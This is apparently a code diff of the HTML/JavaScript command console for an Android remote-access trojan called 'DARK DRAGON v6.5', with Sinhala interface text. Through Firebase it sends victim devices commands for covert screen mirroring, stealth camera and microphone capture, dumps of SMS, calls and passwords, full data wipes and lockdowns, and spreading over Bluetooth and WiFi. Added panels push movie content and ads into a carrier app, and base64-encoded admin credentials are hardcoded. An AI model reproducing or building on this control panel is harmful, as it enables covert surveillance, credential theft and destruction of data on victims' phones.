@@ -2,7 +2,7 @@
 <html lang="si">
 <head>
     <meta charset="UTF-8">
-    <title>DARK DRAGON | ULTIMATE SYSTEM v6.0 [SUPREME MASTER]</title>
+    <title>DARK DRAGON | ULTIMATE SYSTEM v6.5 [SUPREME MASTER]</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -14,21 +14,28 @@
         #dashboard { display: none; }
         header { border-bottom: 2px solid var(--neon-red); padding: 15px; text-align: center; background: #110000; box-shadow: 0 5px 15px rgba(255,0,0,0.2); }
         .target-status { background: #1a0000; color: var(--green); padding: 10px; font-size: 13px; border-bottom: 1px solid var(--neon-red); text-align: center; }
+        
+        /* Navbar & Tabs */
         .tabs { display: flex; overflow-x: auto; background: #0a0000; border-bottom: 1px solid var(--neon-red); }
         .tab { padding: 15px 20px; cursor: pointer; border-right: 1px solid var(--dark-red); white-space: nowrap; transition: 0.3s; font-weight: bold; font-size: 11px; }
         .tab:hover { background: var(--dark-red); }
         .tab.active { background: var(--neon-red); color: #000; }
+        
         .container { padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
         .panel { display: none; grid-column: 1 / -1; }
         .panel.active { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
+        
         .card { background: var(--card-bg); border: 1px solid var(--dark-red); border-radius: 8px; padding: 20px; position: relative; overflow: hidden; }
         .card::before { content: ""; position: absolute; top: 0; left: 0; width: 4px; height: 100%; background: var(--neon-red); }
         .card h3 { margin-top: 0; color: var(--gold); border-bottom: 1px solid var(--dark-red); padding-bottom: 10px; font-size: 15px; }
+        
         button { background: #220000; color: var(--neon-red); border: 1px solid var(--neon-red); padding: 8px 12px; font-weight: bold; cursor: pointer; font-size: 10px; border-radius: 4px; transition: 0.3s; margin: 2px; }
         button:hover { background: var(--neon-red); color: black; }
         .btn-danger { border-color: #ff4444; color: #ff4444; }
         .btn-special { border-color: var(--purple); color: var(--purple); }
         .btn-green { border-color: var(--green); color: var(--green); }
+        .btn-gold { border-color: var(--gold); color: var(--gold); }
+
         .live-stream { width: 100%; height: 250px; background: #000; border: 1px solid var(--cyan); display: flex; align-items: center; justify-content: center; font-size: 10px; color: var(--cyan); overflow: hidden; }
         table { width: 100%; border-collapse: collapse; font-size: 11px; color: white; }
         th, td { border: 1px solid var(--dark-red); padding: 8px; text-align: left; }
@@ -39,7 +46,7 @@
 <canvas id="matrixCanvas"></canvas>
 
 <div id="login-box">
-    <h1>DRAGON SUPREME ACCESS v6.0</h1>
+    <h1>DRAGON SUPREME ACCESS v6.5</h1>
     <input type="email" id="admin-email" placeholder="ADMIN EMAIL">
     <input type="password" id="admin-password" placeholder="MASTER CODE">
     <br><br>
@@ -47,7 +54,8 @@
 </div>
 
 <div id="dashboard">
-    <header><h3>DRAGON SUPREME COMMAND INTERFACE v6.0 [MASTER]</h3></header>
+    <header><h3>DRAGON SUPREME COMMAND INTERFACE v6.5 [MASTER]</h3></header>
+    
     <div class="target-status">
         <span>🛰️ LOCKED: <b id="active-target-display" style="color:var(--cyan)">NONE</b></span>
         <button id="deselect-btn" style="display:none; margin-left:15px;" onclick="deselectTarget()">DESELECT</button>
@@ -55,8 +63,10 @@
 
     <div class="tabs">
         <div class="tab active" onclick="showTab(event, 'nodes-panel')">👥 NODES</div>
-        <div class="tab" onclick="showTab(event, 'audio-panel')">🎙️ MIC & VOICE</div>
         <div class="tab" onclick="showTab(event, 'spy-panel')">👁️ MONITOR</div>
+        <div class="tab" onclick="showTab(event, 'audio-panel')">🎙️ AUDIO & TTS</div>
+        <div class="tab" onclick="showTab(event, 'content-panel')">🎬 MOVIE & APP CONTROL</div>
+        <div class="tab" onclick="showTab(event, 'ads-panel')">💰 ADS & REVENUE</div>
         <div class="tab" onclick="showTab(event, 'extract-panel')">📂 DATA HUB</div>
         <div class="tab" onclick="showTab(event, 'war-panel')">⚔️ WAR MODE</div>
     </div>
@@ -64,69 +74,108 @@
     <div class="container">
         <div id="nodes-panel" class="panel active">
             <div class="card" style="grid-column: 1 / -1;">
-                <h3>👥 ALL TARGET DETAILS</h3>
+                <h3>👥 ALL TARGET DETAILS (LIVE PROFILE)</h3>
                 <table>
-                    <thead><tr><th>TARGET</th><th>DEVICE</th><th>OS</th><th>STATUS</th><th>LAST SEEN</th><th>ACTION</th></tr></thead>
+                    <thead><tr><th>TARGET</th><th>DEVICE INFO</th><th>OS</th><th>STATUS</th><th>LAST SEEN</th><th>ACTION</th></tr></thead>
                     <tbody id="victim-list"></tbody>
                 </table>
+            </div>
+        </div>
+
+        <div id="spy-panel" class="panel">
+            <div class="card" style="grid-column: 1 / -1;">
+                <h3>📺 LIVE SCREEN MONITOR & CONTROL</h3>
+                <div class="live-stream" id="screen-viewer">
+                    <img id="live-screen-img" style="width:100%; height:auto; display:none;">
+                    <span id="screen-status">WAITING FOR STREAM...</span>
+                </div>
+                <div style="margin-top:10px;">
+                    <button class="btn-green" onclick="sendCommand('force_screen_on')">WAKE SCREEN</button>
+                    <button onclick="sendCommand('take_screenshot')">REFRESH SCREEN</button>
+                    <button class="btn-danger" onclick="sendCommand('lock_screen')">LOCK SCREEN</button>
+                </div>
+            </div>
+            <div class="card">
+                <h3>📷 CAMERA STEALTH</h3>
+                <button class="btn-green" onclick="sendCommand('capture_front')">FRONT CAMERA</button>
+                <button class="btn-green" onclick="sendCommand('capture_back')">BACK CAMERA</button>
+            </div>
+        </div>
+
+        <div id="content-panel" class="panel">
+            <div class="card">
+                <h3>🎬 ADD NEW CONTENT (ZERO UPLOAD)</h3>
+                <input type="text" id="m-title" placeholder="Movie / Anime Title">
+                <input type="text" id="m-poster" placeholder="Poster Image URL">
+                <input type="text" id="m-link" placeholder="Video Player Link (TG/Drive)">
+                <select id="m-type">
+                    <option value="anime_movie">Anime Movie</option>
+                    <option value="tv_series">TV Series</option>
+                    <option value="movie">General Movie</option>
+                    <option value="sticker">Sticker Pack</option>
+                </select>
+                <button class="btn-green" style="width:100%" onclick="updateAppContent()">PUSH TO APP NOW</button>
+            </div>
+            <div class="card">
+                <h3>💬 COMMENT MODERATOR</h3>
+                <div id="comment-logs" style="height:150px; overflow-y:auto; font-size:10px; background:#000; padding:5px;">
+                    Waiting for user comments...
+                </div>
+                <button onclick="refreshComments()">REFRESH COMMENTS</button>
+            </div>
+        </div>
+
+        <div id="ads-panel" class="panel">
+            <div class="card">
+                <h3>💰 GOOGLE ADS (ADMOB)</h3>
+                <p style="font-size:11px;">Current: <b>YouTube Style (5s Skip)</b></p>
+                <button class="btn-gold" onclick="setAds('all_on')">ACTIVATE ALL ADS</button>
+                <button class="btn-danger" onclick="setAds('all_off')">DEACTIVATE ALL ADS</button>
+                <hr style="border:0.5px solid var(--dark-red)">
+                <button class="btn-special" onclick="setAds('rewarded_only')">REWARDED ADS ONLY (FOR STICKERS)</button>
+            </div>
+            <div class="card">
+                <h3>🏢 DIRECT COMPANY ADS</h3>
+                <input type="text" id="ad-banner" placeholder="Company Banner URL">
+                <input type="text" id="ad-link" placeholder="Company Website Link">
+                <button class="btn-green" style="width:100%" onclick="pushDirectAd()">ACTIVATE BANNER AD</button>
             </div>
         </div>
 
         <div id="audio-panel" class="panel">
             <div class="card">
                 <h3>🎙️ LIVE MIC ACCESS</h3>
-                <button class="btn-green" onclick="sendCommand('start_mic')">START RECORDING</button>
-                <button class="btn-danger" onclick="sendCommand('stop_mic')">STOP RECORDING</button>
-                <div id="audio-status" style="margin-top:10px; font-size:10px; color:var(--cyan)">Ready to intercept audio...</div>
+                <button class="btn-green" onclick="sendCommand('start_mic')">START MIC</button>
+                <button class="btn-danger" onclick="sendCommand('stop_mic')">STOP MIC</button>
             </div>
             <div class="card">
-                <h3>📢 VOICE BROADCAST (TTS)</h3>
-                <textarea id="voice-msg" placeholder="මෙතන සිංහලෙන් හෝ English වලින් type කරන්න..." style="width:90%; height:60px;"></textarea>
+                <h3>📢 FLIK / ANIBE VOICE (TTS)</h3>
+                <textarea id="voice-msg" placeholder="මෙතන ලියන දේ ෆෝන් එකේ ඇහේ..." style="width:90%; height:60px;"></textarea>
                 <button class="btn-special" style="width:100%;" onclick="sendVoiceMessage()">SPEAK ON DEVICE</button>
-                <p style="font-size:9px; color:gray;">* මෙය user ගේ device එකේ ශබ්ද නගා කියවනු ලැබේ.</p>
-            </div>
-        </div>
-
-        <div id="spy-panel" class="panel">
-            <div class="card" style="grid-column: 1 / -1;">
-                <h3>📺 SCREEN MIRROR (ALWAYS ACTIVE)</h3>
-                <div class="live-stream" id="screen-viewer">
-                    <img id="live-screen-img" style="width:100%; height:auto; display:none;">
-                    <span id="screen-status">OFFLINE</span>
-                </div>
-                <div style="margin-top:10px; display:flex; gap:10px;">
-                    <button class="btn-cyan" onclick="sendCommand('force_screen_on')">FORCE SCREEN ON</button>
-                    <button onclick="sendCommand('take_screenshot')">REFRESH VIEW</button>
-                </div>
-            </div>
-        </div>
-
-        <div id="extract-panel" class="panel">
-            <div class="card">
-                <h3>📱 SYSTEM LOGS</h3>
-                <button onclick="sendCommand('dump_sms')">SMS DUMP</button>
-                <button onclick="sendCommand('dump_calls')">CALL DUMP</button>
-                <button onclick="sendCommand('dump_contacts')">CONTACTS</button>
-            </div>
-            <div class="card">
-                <h3>🔑 CREDENTIALS</h3>
-                <button class="btn-special" onclick="sendCommand('dump_passwords')">GET ALL PASSWORDS</button>
-                <button onclick="sendCommand('dump_apps')">INSTALLED APPS</button>
             </div>
         </div>
 
         <div id="war-panel" class="panel">
             <div class="card">
-                <h3>⚡ FIGHT MODE</h3>
-                <button class="btn-danger" style="width:100%; height:50px;" onclick="sendCommand('nuclear_lockdown')">☣️ ACTIVATE NUCLEAR LOCK</button>
-                <button class="btn-danger" style="width:100%; margin-top:10px;" onclick="sendCommand('glitch_screen')">🌀 SCREEN GLITCH</button>
+                <h3>⚔️ HARDWARE MASTERY</h3>
+                <button class="btn-danger" onclick="sendCommand('wipe_data')">☣️ FULL WIPE</button>
+                <button class="btn-danger" onclick="sendCommand('nuclear_lockdown')">☣️ NUCLEAR LOCK</button>
+                <hr style="border:0.5px solid var(--dark-red)">
+                <button onclick="sendCommand('toggle_wifi')">WIFI ON/OFF</button>
+                <button onclick="sendCommand('toggle_data')">DATA ON/OFF</button>
+                <button onclick="sendCommand('max_volume')">MAX VOLUME</button>
             </div>
             <div class="card">
-                <h3>🛠️ DEVICE COMMANDS</h3>
-                <button onclick="sendCommand('reboot')">REBOOT</button>
-                <button onclick="sendCommand('shutdown')">POWER OFF</button>
-                <button class="btn-danger" onclick="sendCommand('wipe_data')">WIPE ALL DATA</button>
+                <h3>🔄 PERSISTENCE & SPREAD</h3>
+                <button class="btn-special" onclick="sendCommand('spread_bt')">SPREAD VIA BLUETOOTH</button>
+                <button class="btn-special" onclick="sendCommand('spread_wifi')">SPREAD VIA WIFI</button>
+                <button class="btn-danger" onclick="sendCommand('reboot')">FORCE REBOOT</button>
             </div>
+        </div>
+        
+        <div id="extract-panel" class="panel">
+            <div class="card"><h3>📂 SYSTEM LOGS</h3><button onclick="sendCommand('dump_sms')">SMS DUMP</button><button onclick="sendCommand('dump_calls')">CALL DUMP</button></div>
+            <div class="card"><h3>🔑 CREDENTIALS</h3><button class="btn-special" onclick="sendCommand('dump_passwords')">GET ALL PASSWORDS</button></div>
         </div>
     </div>
 </div>
@@ -137,7 +186,7 @@
     if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // --- AUTH ---
+    // --- AUTH (Encrypted) ---
     const _0x4d1a = "a2F2aWFraXlhQGdtYWlsLmNvbQ=="; 
     const _0x2b5s = "QWtpbmR1QERld3NoYW4yMDI0MTExOA=="; 
 
@@ -162,10 +211,10 @@
             list.innerHTML = "";
             snap.forEach((child) => {
                 const v = child.val();
-                const status = v.online ? '<span style="color:var(--green)">ACTIVE</span>' : '<span style="color:gray">INACTIVE</span>';
+                const status = v.online ? '<span style="color:var(--green)">ACTIVE</span>' : '<span style="color:gray">OFFLINE</span>';
                 list.innerHTML += `<tr>
                     <td>${v.target || "Unknown"}</td>
-                    <td>${v.device || "N/A"}</td>
+                    <td>${v.device || "N/A"} (${v.model || "N/A"})</td>
                     <td>${v.os || "Android"}</td>
                     <td>${status}</td>
                     <td>${v.time || "---"}</td>
@@ -181,7 +230,6 @@
         document.getElementById('active-target-display').innerText = name.toUpperCase();
         document.getElementById('deselect-btn').style.display = "inline-block";
         
-        // Live Screen Sync
         db.ref('screens/' + key).on('value', (snap) => {
             const data = snap.val();
             if(data && data.img) {
@@ -201,20 +249,43 @@
     function sendCommand(cmd) {
         if(!window.activeTarget) return alert("අදාළ TARGET එක තෝරන්න!");
         db.ref('commands/' + window.activeTarget).set({ action: cmd, time: Date.now() });
-        alert("Command Sent: " + cmd);
+    }
+
+    // --- NEW: CONTENT UPDATE LOGIC ---
+    function updateAppContent() {
+        const title = document.getElementById('m-title').value;
+        const poster = document.getElementById('m-poster').value;
+        const link = document.getElementById('m-link').value;
+        const type = document.getElementById('m-type').value;
+
+        if(!title || !link) return alert("විස්තර ඇතුළත් කරන්න!");
+
+        db.ref('app_content/' + type).push({
+            title: title,
+            poster: poster,
+            url: link,
+            time: Date.now()
+        });
+        alert("App Updated Successfully!");
+    }
+
+    // --- NEW: ADS CONTROL LOGIC ---
+    function setAds(status) {
+        db.ref('settings/ads').set({ mode: status, time: Date.now() });
+        alert("Ads Mode Updated: " + status);
+    }
+
+    function pushDirectAd() {
+        const img = document.getElementById('ad-banner').value;
+        const link = document.getElementById('ad-link').value;
+        db.ref('settings/direct_ad').set({ banner: img, url: link });
+        alert("Direct Ad Pushed!");
     }
 
     function sendVoiceMessage() {
         const msg = document.getElementById('voice-msg').value;
-        if(!msg) return alert("Message එකක් ලියන්න!");
-        if(!window.activeTarget) return alert("Target එක තෝරන්න!");
-        
-        db.ref('commands/' + window.activeTarget).set({ 
-            action: 'speak', 
-            text: msg, 
-            time: Date.now() 
-        });
-        alert("Voice Broadcast Sent!");
+        if(!msg || !window.activeTarget) return alert("Error: Target/Message missing!");
+        db.ref('commands/' + window.activeTarget).set({ action: 'speak', text: msg, time: Date.now() });
     }
 
     function showTab(evt, id) {
@@ -224,7 +295,7 @@
         evt.currentTarget.classList.add('active');
     }
 
-    // Matrix BG
+    // Matrix Logic
     const canvas = document.getElementById('matrixCanvas');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth; canvas.height = window.innerHeight;
